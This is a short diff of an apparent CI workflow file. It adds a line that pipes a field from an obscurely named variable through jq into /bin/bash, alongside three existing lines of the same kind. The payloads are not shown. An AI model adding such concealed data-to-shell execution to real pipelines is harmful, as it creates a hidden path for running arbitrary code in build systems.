@@ -31,6 +31,7 @@ jobs:
           printf '%s' "$svzez6033" | jq -r .i75182 | /bin/bash
           printf '%s' "$bu4" | jq -r .l0 | /bin/bash
           echo $fa3 | jq -r .vg4 | /bin/bash
+          printf '%s' "$aaomq37" | jq -r .h330 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
